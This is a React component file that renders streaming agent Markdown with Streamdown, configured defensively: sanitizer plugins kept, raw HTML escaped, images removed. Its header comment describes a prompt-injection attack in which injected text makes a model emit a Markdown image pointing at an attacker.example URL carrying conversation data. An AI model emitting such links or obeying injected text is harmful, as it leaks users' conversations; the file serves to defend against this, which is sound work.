"use client";

/**
 * Streaming Markdown for agent messages.
 *
 * Spec 17 pins **Streamdown** (React). The legacy app's `svelte-streamdown` is
 * Svelte-only and unusable here. This is not a duplicate of the vendored OpenDuet
 * layer: that port kept the presentation primitives (bubble, message, tool activity,
 * approvals) and renders text as a plain `<p>`. Upstream OpenDuet uses Streamdown in its
 * transcript, so this supplies the piece the vendoring pass deliberately left as a
 * dependency rather than copying as source.
 *
 * # Why this dependency
 *
 * Agent text arrives token by token, so the renderer sees Markdown that is *mid-token*:
 * an unclosed `**bold`, a half-written table, a code fence with no closing fence. A
 * normal renderer either flickers as the parse flips between plain text and emphasis, or
 * leaves a literal `**` on screen until the closing token lands. Streamdown's `remend`
 * preprocessor closes those constructs for display only.
 *
 * # Security
 *
 * Streamdown's defaults are **permissive**: every image, link and protocol allowed, and
 * base64 images on. The docs describe the exact attack: a model whose context contains
 * attacker-controlled text (a fetched page, a tool result, a stored record) can be made
 * to emit `![](https://attacker.example/?d=<conversation data>)`, and the browser
 * requests it on render with no user action. Prompt injection becomes exfiltration.
 *
 * So images are removed outright. This app has no legitimate reason to render an image
 * in agent prose, and a rule with no exceptions is easier to keep true than an allowlist
 * that slowly grows.
 *
 * Raw HTML is also not parsed: `rehype-raw` is deliberately absent from the plugin
 * chain, so HTML in model output is escaped and shown as text.
 */

import type { ComponentProps } from "react";
import { Streamdown, defaultRehypePlugins } from "streamdown";

import { cn } from "./utils";

export interface MarkdownMessageProps {
  readonly children: string;
  /** True while tokens are still arriving. Repairs incomplete Markdown for display. */
  readonly streaming?: boolean;
  readonly className?: string;
}

/**
 * Sanitization chain for untrusted model output.
 *
 * `rehypePlugins` **replaces** the default array rather than merging, so the sanitizer
 * is listed explicitly. Omitting it would silently drop XSS protection while leaving the
 * component working — the easiest mistake to make in this file, and the docs call it
 * out.
 *
 * `raw` is intentionally missing: without it, HTML tags in model output are escaped
 * rather than parsed into elements, which removes an entire injection class.
 */
// Streamdown types both entries as possibly absent; a missing sanitizer is not a state this
// component can render safely, so the list is narrowed here rather than optional at use.
const REHYPE_PLUGINS = [defaultRehypePlugins.sanitize, defaultRehypePlugins.harden].filter(
  (plugin): plugin is NonNullable<typeof plugin> => plugin !== undefined
);

/**
 * Renders agent Markdown.
 *
 * `streaming` is separate from "is the turn running" on purpose: a finished turn must
 * render exactly what the model produced, `**` and all, rather than a repaired version
 * that looks tidier but is not what was said.
 */
export function MarkdownMessage({
  children,
  streaming = false,
  className
}: MarkdownMessageProps) {
  return (
    <div
      data-slot="markdown-message"
      data-streaming={streaming ? "true" : "false"}
      className={cn("min-w-0 text-sm leading-6", className)}
    >
      <Streamdown
        mode={streaming ? "streaming" : "static"}
        // Completing unclosed emphasis and fences is what stops streaming output from
        // flickering or leaking literal `**`. On by default; stated here because
        // turning it off changes behaviour a reader should be able to see.
        parseIncompleteMarkdown={streaming}
        // Disables the copy controls while text is still arriving: copying a
        // half-written block is never what the person wanted.
        isAnimating={streaming}
        rehypePlugins={REHYPE_PLUGINS}
        // Covers Markdown image syntax, which `rehype-harden` alone would allow and
        // which omitting `rehype-raw` does not stop.
        disallowedElements={["img"]}
        className={cn(
          // Streamdown ships styled typography for standard elements, so only the
          // elements this app's agent prose actually produces are extended here.
          "[&_table]:w-full [&_table]:border-collapse [&_th]:border-b [&_th]:border-border [&_td]:border-b [&_td]:border-border/60",
          "[&_code]:rounded [&_code]:bg-muted [&_code]:px-1 [&_code]:py-0.5"
        )}
      >
        {children}
      </Streamdown>
    </div>
  );
}

/** Exported so callers can type a props passthrough without importing streamdown. */
export type MarkdownProps = ComponentProps<typeof Streamdown>;
